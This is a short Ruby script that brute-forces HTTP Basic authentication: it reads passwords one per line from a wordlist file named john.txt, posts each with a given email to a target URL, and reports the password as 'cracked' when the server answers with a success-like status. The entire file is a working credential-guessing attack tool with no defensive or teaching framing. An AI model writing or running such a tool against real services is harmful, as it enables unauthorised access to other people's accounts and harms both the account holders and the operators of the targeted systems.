require "net/http"
require "uri"
require "json"

def brute_force(url, email)
  File.open("john.txt") do |f|
    f.each_line do |password|
      pass = password.strip!
      uri = URI.parse(url)
      request = Net::HTTP::Post.new(uri)
      request.basic_auth("#{email}", "#{pass}")
      request.content_type = "application/json"

      req_options = {
        use_ssl: uri.scheme == "https",
      }

      response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
        http.request(request)
      end
      if ['201','400','204','200'].include? response.code
        puts "Password has been cracked!! #{pass} is the password used.\n"
        puts response.body
        exit
      else
        puts "#{email} : #{pass}"
        puts "#{response.code} : #{response.body}"
        puts "Could not crack password.\n\n"
      end
    end
  end
end
